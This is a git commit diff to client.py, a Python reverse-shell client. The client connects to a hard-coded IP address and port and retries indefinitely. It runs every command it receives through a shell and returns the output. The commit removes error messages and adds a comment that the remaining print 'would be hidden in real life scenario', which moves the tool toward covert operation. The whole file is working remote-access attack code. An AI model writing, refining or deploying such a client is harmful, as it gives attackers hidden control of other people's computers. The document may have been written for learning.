ea90dbb62a686b99c4d524559024eab07c6e9872
aweiiy <e.sarauskas1@gmail.com>
2021-05-23 02:51:44 +0300

    Update client.py

--- client.py
+++ client.py
@@ -3,17 +3,19 @@ import socket
 import subprocess
 import time
 
-#Create a socket
+
+# Create a socket
 def socket_create():
     try:
         global host
         global port
         global s
-        host = '10.0.0.86'
+        host = '192.168.8.109'
         port = 9999
         s = socket.socket()
-    except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+    except:
+        pass
+
 
 # Connect to a remote socket
 def socket_connect():
@@ -21,11 +23,11 @@ def socket_connect():
         global host
         global port
         global s
-        s.connect((host,port))
+        s.connect((host, port))
     except socket.error as msg:
-        print("Socket creation error: " + str(msg))
         time.sleep(5)
         socket_connect()
+
 
 # Receive commands from remote server and run on local machine
 def receive_commands():
@@ -41,15 +43,15 @@ def receive_commands():
             break
         if len(data) > 0:
             try:
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = str(output_bytes, "utf-8")
                 s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str) #for them to know
+                print(output_str)  # for debug (would be hidden in real life scenario)
             except:
                 output_str = "Commands not recognized" + "\n"
                 s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str)
     s.close()
 
 
@@ -60,9 +62,9 @@ def main():
         socket_connect()
         receive_commands()
     except:
-        print("Error in main")
         time.sleep(5)
     s.close()
     main()
+
 
 main()
